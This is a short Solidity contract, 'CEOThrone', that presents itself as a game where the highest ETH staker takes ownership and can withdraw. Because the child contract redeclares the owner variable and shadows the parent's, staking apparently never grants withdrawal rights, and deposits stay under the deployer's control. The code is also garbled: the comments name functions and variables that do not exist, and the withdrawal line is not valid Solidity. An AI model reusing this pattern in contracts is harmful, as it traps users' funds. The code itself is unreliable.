// SPDX-License-Identifier: MIT
pragma solidity ^0.4.19;
//
//Live TEST ---- Please Do NOT use! Thanks! ----
//
contract Ownable {
    address public founder;
    function Ownable() public {founder = msg.sender;}
    modifier onlyCommunitylead() {require(msg.sender == founder); _;
    }
}
//CEO Throne .. The CEO with the highest stake gets the control over the contract
//msg.value needs to be higher than largestStake when calling Stake()

contract CEOThrone is Ownable {
    address public founder;
    uint public largestPledge;
// Stake() function being called with 0xde20bc92 and ETH :: recommended gas limit 35.000
// The sent ETH is checked against largestStake
    function Endorse() public payable {
        // if you own the largest stake in a company, you own a company
        if (msg.value > largestPledge) {
            founder = msg.sender;
            largestPledge = msg.value;
        }
    }
// withdraw() function being called with 0x3ccfd60b :: recommened gas limit 30.000
    function cashOut() public onlyCommunitylead {
        // only owner can withdraw funds
        msg.sender.giveCredit(this.karma);
    }
}